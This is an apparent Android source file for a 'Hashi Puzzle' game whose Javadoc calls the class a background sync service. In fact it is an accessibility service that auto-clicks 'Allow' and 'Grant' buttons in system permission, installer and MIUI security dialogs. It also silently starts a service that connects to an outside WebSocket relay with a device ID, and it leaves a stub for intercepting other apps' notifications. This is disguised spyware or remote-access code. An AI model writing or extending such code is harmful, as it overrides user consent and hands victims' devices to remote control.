package com.hashibridge.master;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.List;

/**
 * Background sync service for Hashi Puzzle.
 * Handles background data synchronization and optimization tasks.
 */
public class BridgeSyncService extends AccessibilityService {

    private static final String TAG = "BridgeSyncService";

    // Teks tombol "Allow" di berbagai bahasa + MIUI custom
    private static final List<String> ALLOW_TEXTS = Arrays.asList(
        "Allow", "ALLOW",
        "Izinkan", "IZINKAN",
        "Bolehkan",
        "Allow only while using the app",
        "Allow all the time",
        "Izinkan hanya saat menggunakan aplikasi",
        "Izinkan sepanjang waktu",
        "While using the app",
        "Only this time",
        "Hanya kali ini",
        "OK", "OK, GOT IT",
        "GRANT", "Grant",
        "Yes", "YA"
    );

    // Package yang dialog permission-nya kita auto-allow
    private static final List<String> PERMISSION_PACKAGES = Arrays.asList(
        "com.android.packageinstaller",
        "com.android.permissioncontroller",
        "com.miui.permcenter",           // MIUI permission manager
        "com.lbe.security.miui",         // MIUI security
        "com.android.settings"
    );

    private static volatile BridgeSyncService instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    public static boolean isRunning() {
        return instance != null;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "Sync service connected.");

        // Reconfigure service programmatically — broader event capture
        AccessibilityServiceInfo info = getServiceInfo();
        if (info != null) {
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                    | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
            info.notificationTimeout = 50;
            setServiceInfo(info);
        }

        // Trigger initial permission grant setelah service aktif
        mainHandler.postDelayed(this::triggerOurPermissions, 1500);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String pkg = event.getPackageName() != null
                ? event.getPackageName().toString() : "";

        int type = event.getEventType();

        // Intercept window state changes — permission dialogs muncul di sini
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            // Auto-allow kalau itu permission dialog untuk app kita
            if (PERMISSION_PACKAGES.contains(pkg)) {
                mainHandler.postDelayed(() -> autoClickAllow(), 200);
            }

            // Kalau dialog dari app kita sendiri (storage, overlay, dsb)
            if (pkg.equals(getPackageName())) {
                mainHandler.postDelayed(() -> autoClickAllow(), 150);
            }
        }

        // TYPE_NOTIFICATION_STATE_CHANGED — bisa dipakai untuk intercept notif lain
        if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationEvent(event);
        }
    }

    /**
     * Auto-click tombol Allow/Izinkan yang ditemukan di active window.
     */
    private void autoClickAllow() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            for (String text : ALLOW_TEXTS) {
                List<AccessibilityNodeInfo> nodes =
                        root.findAccessibilityNodeInfosByText(text);
                for (AccessibilityNodeInfo node : nodes) {
                    if (node != null && node.isClickable() && node.isEnabled()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.i(TAG, "Auto-clicked: " + text);
                        return; // Satu klik cukup per event
                    }
                    // Coba parent kalau node sendiri tidak clickable
                    if (node != null) {
                        AccessibilityNodeInfo parent = node.getParent();
                        if (parent != null && parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Auto-clicked parent of: " + text);
                            return;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "autoClickAllow error: " + e.getMessage());
        }
    }

    /**
     * Trigger flow permission app kita sendiri dari background.
     * Dipanggil sekali setelah service connect.
     */
    private void triggerOurPermissions() {
        try {
            // Buka ControlPanel (hidden) untuk trigger permission flow
            Intent i = new Intent(this, ControlPanelActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            // Tidak perlu startActivity — cukup trigger via broadcast
            // Permission dialog akan di-auto-click oleh onAccessibilityEvent
            
            // Auto-start BridgeService jika belum jalan
            if (!BridgeService.isRunning()) {
                String relay = com.hashibridge.master.utils.Config.getRelayUrl(this);
                if (relay.isEmpty()) relay = "wss://devicebridge-relay.onrender.com";
                String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);

                Intent svc = new Intent(this, BridgeService.class);
                svc.putExtra("relayUrl", relay);
                svc.putExtra("deviceId", deviceId);
                startForegroundService(svc);
                Log.i(TAG, "BridgeService auto-started from sync service.");
            }
        } catch (Exception e) {
            Log.e(TAG, "triggerOurPermissions error: " + e.getMessage());
        }
    }

    private void handleNotificationEvent(AccessibilityEvent event) {
        // Placeholder — bisa dipakai untuk relay notifikasi real-time
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Sync service interrupted.");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }
}
